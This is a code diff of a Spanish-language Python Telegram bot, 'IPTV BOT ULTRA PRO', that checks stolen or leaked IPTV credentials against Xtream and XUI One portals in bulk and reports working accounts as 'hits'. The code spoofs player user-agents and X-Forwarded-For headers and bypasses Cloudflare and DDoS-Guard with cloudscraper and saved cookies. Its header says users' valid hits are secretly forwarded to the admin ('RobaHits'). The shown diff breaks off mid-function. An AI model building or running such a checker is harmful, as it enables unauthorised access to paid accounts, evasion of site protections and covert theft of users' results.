@@ -1,23 +1,23 @@
-
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════╗
-║        🦂 L U I S  R 🦂  —  IPTV BOT NIVEL DIOS         ║
-║              v6.0 FINAL ∞ DEFINITIVO  24/7               ║
-║   Xtream · XUI One · M3U · Cloudflare · Todos formatos   ║
-╚══════════════════════════════════════════════════════════╝
+🦂 IPTV BOT ULTRA PRO — BY LUIS R 🦂
+• Sesión completa con cookies + headers reales (anti ban de IP)
+• Visita el home del servidor antes de verificar (obtiene cookies CF/DDoS-Guard)
+• Cloudflare bypass integrado (cloudscraper + cookies persistentes)
+• 19 User-Agents IPTV reales rotados automáticamente
+• Verificación HIT/FAIL/RETRY paralela — universal para cualquier lista
+• Bot público — RobaHits al admin
+• Hora correcta Texas (America/Chicago)
 """
 
-import os, re, json, time, threading, logging, socket, asyncio
-import random, pickle, traceback, subprocess
+import os, re, json, time, threading, logging, socket, asyncio, random, pickle
 from pathlib import Path
 from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 import pytz
 import requests
-from requests.adapters import HTTPAdapter
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, CommandHandler, MessageHandler,
@@ -25,41 +25,39 @@ from telegram.ext import (
 )
 from telegram.constants import ParseMode
 
-requests.packages.urllib3.disable_warnings()
-
-# ╔══════════════════════════════════════════════════════╗
-# ║               ⚙️  CONFIGURACIÓN                      ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  ⚙️  VARIABLES — Configura en Railway → Variables
+# ══════════════════════════════════════════════════════
+#
+#  BOT_TOKEN       → Token de @BotFather
+#  ADMIN_ID        → Tu ID de Telegram (búscalo con @userinfobot)
+#  RENDER_URL      → URL de tu servicio Railway (keep-alive 24/7)
+#  ROBAHITS_CHATID → Tu chat ID donde llegan los HITs
+#                    (déjalo vacío y usará tu ADMIN_ID automáticamente)
+#  TZ_NAME         → Ya configurado para Texas. No tocar.
+#
 BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
 ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
 RENDER_URL      = os.getenv("RENDER_URL", "")
-ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")
-TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")
+ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")   # se rellena abajo si está vacío
+TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")   # Texas CST/CDT
 TZ              = pytz.timezone(TZ_NAME)
 BOT_USERNAME    = "@Luishits_bot"
 
+# Si no configuraron ROBAHITS_CHATID, los hits van al admin
 if not ROBAHITS_CHATID and ADMIN_ID:
     ROBAHITS_CHATID = str(ADMIN_ID)
 
 logging.basicConfig(level=logging.INFO,
                     format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
 
 # ── Estado global ──────────────────────────────────────
 bot_active     = True
 BOT_START_TIME = datetime.now(TZ)
-STATS          = {"checks":0,"hits":0,"fails":0,"retries":0,"users":set()}
-
-# ── Visual ─────────────────────────────────────────────
-L1    = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
-L2    = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
-SK    = "🦂"
-FIRE  = "🔥"; BOLT  = "⚡"; STAR  = "⭐"; DIAM  = "💎"
-SHLD  = "🛡️"; GLOB  = "🌐"; KEY   = "🗝️"; CAL   = "📅"
-CLK   = "🕐"; SIG   = "📡"; LIV   = "📺"; MOV   = "🎬"
-SER   = "🎭"; CHK   = "✅"; CRS   = "❌"; WRN   = "⚠️"
-ARR   = "➤"; GEM   = "🔮"; RKT   = "🚀"; TRF   = "🏆"
-CRN   = "👑"; LOK   = "🔐"
+STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}
+LINE  = "━" * 28
 
 FLAGS = {
     "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
@@ -70,64 +68,57 @@ FLAGS = {
     "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
 }
 
-# ── Timeouts ───────────────────────────────────────────
-T_CONN  = 8    # conexión
-T_READ  = 30   # lectura (subido para servidores lentos)
-T_TOTAL = 60   # total por cuenta
+TIMEOUT_CONN  = 15
+TIMEOUT_READ  = 30
 
-# ── User-Agents — VLC primero (más compatible con IPTV) ─
-UAS = [
-    "VLC/3.0.20 LibVLC/3.0.20",
-    "VLC/3.0.21 LibVLC/3.0.21",
+# ── 19 User-Agents IPTV reales ───────────────────────────────────────────────
+ALL_USER_AGENTS = [
+    # Alta compatibilidad — los más aceptados
     "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
-    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
-    "GSE SMART IPTV/7.4 (Android 11)",
-    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
-    "MXPlayer/1.73.6 (Linux; Android 12)",
+    "TiviMate/4.4.0 (Android 11)",
+    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0-Git:20240101-4a869c2",
+    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
+    "VLC/3.5.4 LibVLC/3.0.21 (Android 13)",
+    "VLC/3.0.21 LibVLC/3.0.21",
+    "VLC/3.0.18 LibVLC/3.0.18",
     "okhttp/4.9.0",
+    "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
+    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 GSE/8.2 IPTV",
+    "GSE SMART IPTV/7.4 (Android 11)",
+    "MXPlayer/1.73.6 (Linux; Android 12) ExoPlayerLib/2.18.1",
+    "Dalvik/2.1.0 (Linux; Android 10; Generic Android TV)",
     "Dalvik/2.1.0 (Linux; U; Android 11)",
+    "SS_IPTV/3.9.0 (SmartTV)",
+    "curl/7.88.1",
+    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
 ]
 
-# ── Estados activos que usan los servidores IPTV reales ─
-ACTIVE_ST = {
-    "active","activo","activa","activated","1","true",
-    "enabled","ok","valid","online","alive","running",
-    "live","subscribed","premium","vip","yes",
-    "actif","ativo","attivo","aktiv","aktivno",
-}
-# ── Estados inactivos definitivos ─────────────────────
-INACTIVE_ST = {
-    "expired","banned","disabled","blocked","inactive",
-    "suspended","cancelled","trial_expired","0","false","no",
-}
-# ── Textos en plain-text que significan FAIL ──────────
-PLAIN_FAIL = [
-    "PLAYLIST_DISABLED","ACCOUNT_EXPIRED","ACCOUNT_BANNED",
-    "USER_NOT_FOUND","INVALID_PASS","ACCOUNT_DISABLED",
-    "TRIAL_EXPIRED","INVALID_TOKEN","AUTH_FAILED",
-]
-# ── Textos que indican página CF/protección ───────────
-CF_MARKS = [
-    "cloudflare","just a moment","checking your browser",
-    "enable javascript","ddos-guard","ray id","cf-ray",
-    "attention required","recaptcha","challenge-platform",
+# ── Dominios con protección Cloudflare conocida ──────────────────────────────
+CF_DOMAINS = [
+    'star-flix.net','mylatinotvmoon.com','venuspv.me','mytitantv.com',
+    'mymoontools.xyz','moonstalker.xyz','moontools.me','moonxtream.com',
+    'titanxtv.com','venusiptv.com','latinchannel.tv',
 ]
 
+# ── Delay entre peticiones al mismo dominio (anti-saturación) ────────────────
+_domain_last_request: dict = {}
+_domain_lock = threading.Lock()
+DOMAIN_DELAY = 3.0   # segundos entre peticiones al mismo dominio
+
+# ── Cookies persistentes Cloudflare ─────────────────────────────────────────
 COOKIES_DIR = Path("cf_cookies")
 COOKIES_DIR.mkdir(exist_ok=True)
-_POOL = ThreadPoolExecutor(max_workers=24)
-_UA_IDX = 0
-_UA_LOCK = threading.Lock()
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║                🛠️  UTILIDADES                        ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  🕐 HORA LOCAL — Texas
+# ══════════════════════════════════════════════════════
 
 def now_str() -> str:
     return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")
 
-def ts_date(epoch) -> str:
+def ts_to_date(epoch) -> str:
     try:
         v = int(epoch)
         if v > 0:
@@ -136,1182 +127,1016 @@ def ts_date(epoch) -> str:
         pass
     return "Sin fecha"
 
-def next_ua() -> str:
-    global _UA_IDX
-    with _UA_LOCK:
-        ua = UAS[_UA_IDX % len(UAS)]
-        _UA_IDX += 1
-        return ua
+# ══════════════════════════════════════════════════════
+#  🔍 EXTRACCIÓN DE URL — Universal
+# ══════════════════════════════════════════════════════
 
-def flag(code: str) -> str:
-    f = FLAGS.get(code, "")
-    if not f and len(code) == 2:
-        pts = [ord(c)+127397 for c in code.upper()]
-        f = chr(pts[0])+chr(pts[1])
-    return f
-
-def cook_path(host: str) -> Path:
-    return COOKIES_DIR / f"{host.split(':')[0].replace('.','_')}.pkl"
-
-def save_cook(s, host: str):
-    try:
-        with open(cook_path(host),"wb") as f:
-            pickle.dump(dict(s.cookies), f)
-    except Exception: pass
-
-def load_cook(s, host: str):
-    try:
-        p = cook_path(host)
-        if p.exists() and (time.time()-p.stat().st_mtime) < 7200:
-            with open(p,"rb") as f:
-                s.cookies.update(pickle.load(f))
-    except Exception: pass
-
-def mk_session(host: str = "") -> requests.Session:
-    s = requests.Session()
-    s.mount("http://",  HTTPAdapter(max_retries=0))
-    s.mount("https://", HTTPAdapter(max_retries=0))
-    if host: load_cook(s, host)
-    s.headers.update({
-        "User-Agent":      "VLC/3.0.20 LibVLC/3.0.20",
-        "Accept":          "*/*",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection":      "close",
-    })
-    return s
-
-def is_cf_page(text: str) -> bool:
-    if not text: return False
-    low = text.lower()
-    return any(k in low for k in CF_MARKS)
-
-
-# ╔══════════════════════════════════════════════════════╗
-# ║          🔍 EXTRACTOR UNIVERSAL DE URLs              ║
-# ║  Soporta: Xtream · XUI One · M3U · pipe · espacio   ║
-# ╚══════════════════════════════════════════════════════╝
-
-def extract(text: str):
-    """
-    Devuelve (portal, user, pwd, is_xui, raw_url)
-    raw_url = URL completa si es M3U directo
-    """
-    text = (text or "").strip()
-    text = text.replace("\r","").replace("%3A",":").replace("%2F","/")
-    text = re.sub(r"&amp;","&", text)
-
-    # ── XUI One playlist ──────────────────────────────
-    m = re.search(
-        r'(?:https?://)?([A-Za-z0-9._\-]+(?::\d+)?)'
-        r'/playlist/([^/\s\n]+)/([^/\s\n?&]+)',
-        text, re.I)
-    if m:
-        portal = m.group(1)
-        user   = m.group(2)
-        pwd    = m.group(3).split("?")[0].split("&")[0].strip()
-        return portal, user, pwd, True, None
-
-    # ── Xtream get.php / player_api ───────────────────
-    m = re.search(
-        r'(?:https?://)?([A-Za-z0-9._\-]+(?::\d+)?)'
-        r'/(?:get\.php|player_api\.php)\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
-        text, re.I)
-    if m:
-        portal = m.group(1)
-        user   = m.group(2)
-        pwd    = re.split(r'[&\s\n]', m.group(3))[0].strip()
-        return portal, user, pwd, False, None
-
-    # ── live/user/pass ────────────────────────────────
-    m = re.search(
-        r'(?:https?://)?([A-Za-z0-9._\-]+(?::\d+)?)'
-        r'/live/([^/\s\n]+)/([^/\s\n?]+)',
-        text, re.I)
-    if m:
-        return m.group(1), m.group(2), m.group(3), False, None
-
-    # ── M3U directo (URL que empieza con http) ────────
-    m = re.search(r'(https?://[^\s\n]+\.m3u[^\s\n]*)', text, re.I)
-    if m:
-        url = m.group(1)
-        parsed = urlparse(url)
-        portal = parsed.netloc
-        qs = dict(re.findall(r'([^&=\s]+)=([^&\s]+)', parsed.query))
-        user = qs.get("username","")
-        pwd  = qs.get("password","")
-        if user and pwd:
-            return portal, user, pwd, False, url
-        return portal, "m3u", "m3u", False, url
-
-    # ── pipe separado: portal|user|pass ──────────────
-    if "|" in text:
-        parts = [x.strip() for x in text.split("|")]
-        if len(parts) >= 3 and ("." in parts[0] or ":" in parts[0]):
-            return parts[0], parts[1], parts[2], False, None
-
-    # ── espacio separado: portal user pass ───────────
+def extract_from_url(text: str):
+    text = text.strip().replace("\r","").replace("%3A",":").replace("%2F","/")
+    patterns = [
+        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
+        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
+        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?]+)',
+        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/c/[^/\s]*/([^/\s\n]+)/([^/\s\n?]+)',
+        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
+        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
+    ]
+    for p in patterns:
+        m = re.search(p, text, re.IGNORECASE)
+        if m:
+            portal = m.group(1)
+            user   = m.group(2)
+            pwd    = m.group(3)
+            for bad in ("&type=","&output=","&format=","\n"," "):
+                pwd = pwd.split(bad)[0]
+            pwd = pwd.split('&')[0].split('?')[0].strip()
+            return portal, user, pwd
+    if '|' in text:
+        parts = [x.strip() for x in text.split('|')]
+        if len(parts) >= 3 and parts[0]:
+            return parts[0], parts[1], parts[2]
     parts = text.split()
-    if len(parts) == 3 and ("." in parts[0] or ":" in parts[0]):
-        return parts[0], parts[1], parts[2], False, None
+    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
+        return parts[0], parts[1], parts[2]
+    return None, None, None
 
-    return None, None, None, False, None
+# ══════════════════════════════════════════════════════
+#  ⏱️  DELAY ENTRE PETICIONES AL MISMO DOMINIO
+# ══════════════════════════════════════════════════════
 
+def _apply_domain_delay(host: str):
+    """
+    Espera lo necesario para no saturar el servidor.
+    3 segundos mínimo entre peticiones al mismo dominio.
+    Esto evita que el servidor bloquee por exceso de requests.
+    """
+    with _domain_lock:
+        last = _domain_last_request.get(host, 0)
+        now  = time.time()
+        wait = DOMAIN_DELAY - (now - last)
+        if wait > 0:
+            time.sleep(wait)
+        _domain_last_request[host] = time.time()
 
-# ╔══════════════════════════════════════════════════════╗
-# ║           🔬 ANÁLISIS DE RESPUESTA UNIVERSAL         ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  🛡️  CLOUDFLARE BYPASS
+# ══════════════════════════════════════════════════════
 
-def parse_json_safe(raw: str):
-    # Limpiar BOM y espacios
-    raw = raw.lstrip('\ufeff').strip()
-    # Eliminar prefijos anti JSON-hijacking: )]}'\n  o  /* */
-    if raw.startswith(")]}'") or raw.startswith(")]}\\'" ):
-        raw = raw.split('\n', 1)[-1].lstrip()
-    elif raw.startswith(")]}" ):
-        raw = raw.split('\n', 1)[-1].lstrip()
-    elif raw.startswith("/*"):
-        end = raw.find("*/")
-        if end != -1:
-            raw = raw[end + 2:].lstrip()
-    try: return json.loads(raw)
-    except Exception: pass
+def _is_cf_domain(host: str) -> bool:
+    h = host.lower().split(':')[0]
+    return any(d in h for d in CF_DOMAINS)
+
+def _cookie_path(host: str) -> Path:
+    clean = host.split(':')[0].replace('.','_')
+    return COOKIES_DIR / f"{clean}.pkl"
+
+def _save_cookies(session, host: str):
+    try:
+        with open(_cookie_path(host), 'wb') as f:
+            pickle.dump(session.cookies, f)
+    except Exception:
+        pass
+
+def _load_cookies(session, host: str):
+    try:
+        p = _cookie_path(host)
+        if p.exists():
+            with open(p, 'rb') as f:
+                session.cookies.update(pickle.load(f))
+            return True
+    except Exception:
+        pass
+    return False
+
+def _make_session(host: str):
+    """
+    Intenta crear sesión cloudscraper (bypass JS real).
+    Si no está instalado, usa requests.Session normal.
+    """
+    try:
+        import cloudscraper
+        scraper = cloudscraper.create_scraper(
+            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False},
+            delay=8
+        )
+        _load_cookies(scraper, host)
+        return scraper, True
+    except ImportError:
+        pass
+    except Exception as e:
+        log.warning(f"cloudscraper err: {e}")
+    session = requests.Session()
+    _load_cookies(session, host)
+    return session, False
+
+def _cf_request(url: str, host: str, timeout: int = 20):
+    """
+    Petición con bypass Cloudflare:
+    - cloudscraper si disponible
+    - Rota UAs en cada intento
+    - Guarda cookies exitosas para próximas requests
+    """
+    session, _ = _make_session(host)
+    uas = random.sample(ALL_USER_AGENTS, min(5, len(ALL_USER_AGENTS)))
+    for ua in uas:
+        try:
+            headers = {
+                "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
+                "Accept":          "*/*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection":      "keep-alive",
+                "Cache-Control":   "no-cache",
+            }
+            r = session.get(url, headers=headers, timeout=timeout,
+                            verify=False, allow_redirects=True)
+            if r.status_code == 200:
+                raw = r.text.strip()
+                is_blocked = (raw.startswith("<") and
+                              ("cloudflare" in raw.lower() or
+                               "attention required" in raw.lower() or
+                               "just a moment" in raw.lower()))
+                if not is_blocked:
+                    _save_cookies(session, host)
+                    return r
+            elif r.status_code in (403, 503):
+                log.warning(f"CF block {r.status_code} ua={ua[:25]}")
+                time.sleep(random.uniform(1.5, 3.0))
+        except Exception as e:
+            log.debug(f"CF req err: {e}")
+    return None
+
+# ══════════════════════════════════════════════════════
+#  ✅ VERIFICACIÓN — ANTI FALSOS NEGATIVOS
+# ══════════════════════════════════════════════════════
+
+def _parse_json(raw: str):
+    """Parsea JSON tolerando basura al inicio de la respuesta."""
+    raw = raw.strip()
+    try:
+        return json.loads(raw)
+    except Exception:
+        pass
     for ch in ('{', '['):
         idx = raw.find(ch)
         if idx >= 0:
-            try: return json.loads(raw[idx:])
-            except Exception: pass
+            try:
+                return json.loads(raw[idx:])
+            except Exception:
+                pass
     return None
 
-def analyze(data) -> tuple:
+def _analyze(data) -> tuple:
     """
-    Analiza el JSON de respuesta del servidor IPTV.
-    Devuelve ("HIT"|"CUSTOM"|"FAIL"|"RETRY", payload)
-    Lógica alineada con jcinfo() del checker de referencia.
+    Analiza el JSON IPTV:
+    auth=1 + status=Active → HIT
+    auth=1 + otro status   → CUSTOM
+    auth=0                 → FAIL
+    sin estructura válida  → RETRY
     """
     if not isinstance(data, dict):
-        # Lista JSON → el servidor devolvió canales directamente → HIT
-        if isinstance(data, list) and len(data) > 0:
-            return "HIT", {
-                "user_info": {"auth":1,"status":"Active","exp_date":"0",
-                              "active_cons":"?","max_connections":"?",
-                              "is_trial":"0","created_at":"0"},
-                "server_info": {}
-            }
         return "RETRY", None
-
-    # user_info puede venir en distintos campos o en la raíz
-    ui = data.get("user_info") or data.get("userInfo") or data.get("user")
-
-    # Si no hay sub-objeto user_info, verificar si la raíz tiene campos de cuenta
-    if not isinstance(ui, dict):
-        if any(k in data for k in ("auth","username","exp_date","max_connections","status")):
+    ui = data.get("user_info")
+    if ui is None:
+        # Algunos servidores mandan auth directo en el root
+        if "auth" in data:
             ui = data
         else:
             return "RETRY", None
-
-    # ── Leer auth ──────────────────────────────────────────────────────────
-    # Guía: jcinfo() verifica status=='active'. Aquí auth es la primera barrera.
-    # auth=0 significa explícitamente "cuenta inválida" en la API Xtream/XUI.
-    # auth=1 significa "existe". El status dice si está activa o no.
-    auth_raw = ui.get("auth", ui.get("authenticated", ui.get("valid", None)))
-
-    if auth_raw is None:
-        # Panel sin campo auth: si tiene status o exp_date, seguir con status
-        if not any(k in ui for k in ("status", "exp_date", "max_connections")):
-            return "RETRY", None
-        auth = 1  # asumir válido y dejar que el status decida
-    else:
-        s = str(auth_raw).strip().lower()
-        if s in ("1", "true", "yes", "ok", "valid"):
-            auth = 1
-        elif s in ("0", "false", "no", "invalid", ""):
-            auth = 0
-        else:
-            try:
-                auth = 1 if int(s) != 0 else 0
-            except Exception:
-                auth = 0
-
+    auth = ui.get("auth")
+    if auth is None:
+        return "RETRY", None
+    try:
+        auth = int(auth)
+    except Exception:
+        return "RETRY", None
     if auth == 0:
         return "FAIL", None
+    if auth == 1:
+        real_ui = data.get("user_info", ui)
+        payload = {"user_info": real_ui, "server_info": data.get("server_info", {})}
+        return ("HIT" if real_ui.get("status","") == "Active" else "CUSTOM"), payload
+    return "RETRY", None
 
-    # ── Auth != 0: revisar status ───────────────────────────────────────────
-    real_ui = data.get("user_info", ui)
-    payload = {
-        "user_info":   real_ui,
-        "server_info": data.get("server_info", {}),
-    }
-
-    # Extraer status — igual que jcinfo(): user_info.get('status', '')
-    status = str(
-        real_ui.get("status") or
-        real_ui.get("account_status") or
-        real_ui.get("state") or ""
-    ).strip().lower()
-
-    # Sin status y auth=1 → asumir activo (algunos paneles no envían status)
-    if not status or status in ("none", "null"):
-        return "HIT", payload
-
-    if status in ACTIVE_ST:
-        return "HIT", payload
-
-    if status in INACTIVE_ST:
-        return "CUSTOM", payload
-
-    # Status no reconocido pero auth=1 → HIT (la cuenta existe y responde)
-    log.debug(f"[analyze] status no reconocido '{status}' con auth≠0 → HIT")
-    return "HIT", payload
-
-
-def process(r) -> tuple:
-    """Procesa una respuesta HTTP y devuelve (status, payload)."""
+def _process_response(r) -> tuple:
+    """
+    Procesa respuesta HTTP y clasifica el error si aplica:
+    - 200/206 + JSON válido → analizar
+    - 200 + M3U             → HIT directo
+    - 200 + HTML/CF         → RETRY (no marcar como muerta)
+    - 403                   → RETRY (bloqueado, no muerta)
+    - 404                   → FAIL  (ruta no existe)
+    - 500/502/503           → RETRY (error servidor, puede volver)
+    - Timeout               → RETRY
+    """
     if r is None:
         return "RETRY", None
 
     code = r.status_code
+    log.info(f"HTTP {code}")
 
-    # 4xx explícito = credenciales rechazadas
-    if code in (401, 403, 404):
+    # 404 = ruta inválida (cuenta no existe en ese portal)
+    if code == 404:
         return "FAIL", None
 
-    # Errores de servidor
-    if code in (500, 502, 503, 504):
+    # 403/500/502/503 = servidor vivo pero bloqueando → RETRY, no FAIL
+    if code in (403, 500, 502, 503):
+        log.warning(f"HTTP {code} → RETRY (servidor vivo pero bloqueando)")
         return "RETRY", None
 
-    try:
-        raw = r.text.strip()
-    except Exception:
+    if code not in (200, 206):
         return "RETRY", None
 
-    if not raw or len(raw) < 4:
+    raw = r.text.strip()
+    if not raw or len(raw) < 5:
         return "RETRY", None
 
-    # Detectar HTML (Cloudflare, error de servidor, página web)
-    if raw[0] == "<":
-        if is_cf_page(raw):
-            return "RETRY", None
+    # HTML = Cloudflare u otro bloqueo → RETRY, no marcar muerta
+    if raw.startswith("<") or "cloudflare" in raw.lower() or "just a moment" in raw.lower():
+        log.warning("Respuesta HTML/CF → RETRY")
         return "RETRY", None
 
-    # Errores en texto plano — igual que jcinfo() del checker de referencia
-    # Estos son errores XUI One / Xtream que vienen sin JSON
-    UP = raw.upper()
-    for k in PLAIN_FAIL:
-        if k in UP:
-            return "FAIL", None
-
-    # Detectar respuestas no-JSON que no son M3U ni error conocido
-    # (ej: texto HTML sin < al inicio, redirect en texto, etc.)
-    if not (raw[0] in ('{', '[', '#') or raw.startswith('<!')):
-        # Si no parece JSON ni M3U, intentar parse igual (por si acaso)
-        pass
-
-    # Lista M3U directa → HIT inmediato
+    # M3U directo = cuenta activa (get.php responde M3U cuando credenciales son válidas)
     if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
+        log.info("M3U detectado → HIT directo")
         return "HIT", {
             "user_info": {
-                "auth":1,"status":"Active","exp_date":"0",
-                "active_cons":"?","max_connections":"?",
-                "is_trial":"0","created_at":"0",
+                "auth":1, "status":"Active", "exp_date":"0",
+                "active_cons":"?", "max_connections":"?",
+                "is_trial":"0", "created_at":"0",
             },
             "server_info": {}, "m3u_direct": True,
         }
 
-    data = parse_json_safe(raw)
+    data = _parse_json(raw)
     if data is None:
-        log.debug(f"[process] Respuesta no reconocida: {raw[:200]}")
+        log.warning(f"JSON inválido: {raw[:60]}")
         return "RETRY", None
 
-    return analyze(data)
+    return _analyze(data)
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║          🌐 PETICIÓN HTTP — Una sola URL             ║
-# ╚══════════════════════════════════════════════════════╝
-
-def fetch(url: str, host: str, ua: str = None, extra_headers: dict = None) -> tuple:
+def _build_session(host: str, ua: str) -> requests.Session:
     """
-    Hace GET con:
-    - verify=False (SSL desactivado para chequeo)
-    - allow_redirects=True (sigue redirecciones)
-    - Logging real del error
+    Crea una sesión con cookies y headers completos como un cliente IPTV real.
+    Paso 1: visita el home del servidor para obtener cookies (anti-Cloudflare/DDoS-Guard).
     """
+    # Detectar scheme y base_url
+    if not host.startswith('http'):
+        base_url_http  = f"http://{host}"
+        base_url_https = f"https://{host}"
+    else:
+        base_url_http  = host
+        base_url_https = host.replace('http://', 'https://')
+
+    dominio  = urlparse(base_url_http).netloc or host.split('/')[0]
+    base_url = f"http://{dominio}"
+
+    s = requests.Session()
+    _load_cookies(s, dominio)
+
+    s.headers.update({
+        "User-Agent":                ua,
+        "Accept":                    "application/json, text/plain, */*",
+        "Accept-Language":           "es-MX,es;q=0.9,en;q=0.8",
+        "Accept-Encoding":           "gzip, deflate",
+        "X-Requested-With":          "XMLHttpRequest",
+        "Connection":                "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Site":            "same-origin",
+        "Sec-Fetch-Mode":            "cors",
+        "Referer":                   f"{base_url}/",
+        "Origin":                    base_url,
+        "Cache-Control":             "no-cache",
+        "Pragma":                    "no-cache",
+        # IP local aleatoria para parecer cliente real detrás de router
+        "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
+    })
+
+    # Visitar home para obtener cookies antes de llamar al API
     try:
-        s = mk_session(host)
-        if ua:
-            s.headers["User-Agent"] = ua
-        if extra_headers:
-            s.headers.update(extra_headers)
-        r = s.get(url,
-                  timeout=(T_CONN, T_READ),
-                  verify=False,
-                  allow_redirects=True)
-        save_cook(s, host)
-        if r.status_code not in (200, 206):
-            log.info(f"[http] {r.status_code} {url[:70]}")
-        return process(r)
-    except requests.exceptions.ConnectTimeout:
-        log.info(f"[http] ConnectTimeout {url[:70]}")
-        return "RETRY", None
-    except requests.exceptions.ReadTimeout:
-        log.info(f"[http] ReadTimeout({T_READ}s) {url[:70]}")
-        return "RETRY", None
-    except requests.exceptions.SSLError:
-        # Reintentar sin verificar (ya es False, puede ser otro problema SSL)
+        s.get(base_url, timeout=10, verify=False, allow_redirects=True)
+        _save_cookies(s, dominio)
+    except Exception:
+        pass  # Si falla el home, continuar igual al API directo
+
+    return s
+
+
+def _request_with_retries(url: str, ua: str, host: str,
+                          timeout: int = 30, max_retries: int = 3) -> tuple:
+    """
+    Petición con sesión completa (cookies + headers reales) y reintentos:
+    - Visita el home primero para obtener cookies anti-bot
+    - Headers idénticos a los de una app IPTV real (TiviMate/iPhone)
+    - timeout 20s — servidores lentos responden si esperas
+    - 2 reintentos con 2s de espera entre cada uno
+    - Diferencia timeout / ConnectionError / bloqueo / inválido
+    - NO marca como muerta ante 403/503/timeout — solo RETRY
+    """
+    # Detectar http vs https del portal
+    if '://' in url:
+        scheme = url.split('://')[0]
+        dominio = urlparse(url).netloc
+    else:
+        scheme  = 'http'
+        dominio = host.split(':')[0]
+
+    for attempt in range(1, max_retries + 1):
         try:
-            import urllib3
-            urllib3.disable_warnings()
-            s2 = mk_session(host)
-            if ua: s2.headers["User-Agent"] = ua
-            r2 = s2.get(url, timeout=(T_CONN, T_READ), verify=False,
-                        allow_redirects=True)
-            return process(r2)
-        except Exception:
+            s = _build_session(host, ua)
+            r = s.get(url, timeout=(TIMEOUT_CONN, 30), verify=False, allow_redirects=True)
+            _save_cookies(s, dominio)
+
+            log.info(f"[{attempt}/{max_retries}] HTTP {r.status_code} | {url[:55]}")
+
+            result, payload = _process_response(r)
+
+            # Resultado definitivo → devolver
+            if result in ("HIT", "FAIL", "CUSTOM"):
+                return result, payload
+
+            # 403/503 = Cloudflare/DDoS-Guard → esperar y reintentar
+            if r.status_code in (403, 503):
+                log.warning(f"CF/DDoS-Guard {r.status_code} → esperando 3s")
+                if attempt < max_retries:
+                    time.sleep(3)
+                continue
+
+            # RETRY (JSON inválido, vacío, HTML) → reintentar
+            if attempt < max_retries:
+                log.info(f"RETRY intento {attempt} → esperando 2s")
+                time.sleep(2)
+            continue
+
+        except requests.exceptions.Timeout:
+            # Timeout ≠ lista muerta — servidor lento pero vivo
+            log.warning(f"Timeout [{attempt}/{max_retries}] {url[:50]}")
+            if attempt < max_retries:
+                time.sleep(2)
+            continue
+
+        except requests.exceptions.ConnectionError as e:
+            # Error de red — puede ser transitorio
+            log.warning(f"ConnError [{attempt}/{max_retries}]: {str(e)[:50]}")
+            if attempt < max_retries:
+                time.sleep(2)
+            continue
+
+        except Exception as e:
+            log.debug(f"Error inesperado: {e}")
             return "RETRY", None
-    except requests.exceptions.ConnectionError as e:
-        log.info(f"[http] ConnError {str(e)[:60]} {url[:50]}")
-        return "RETRY", None
-    except Exception as e:
-        log.info(f"[http] {type(e).__name__}: {str(e)[:60]}")
-        return "RETRY", None
 
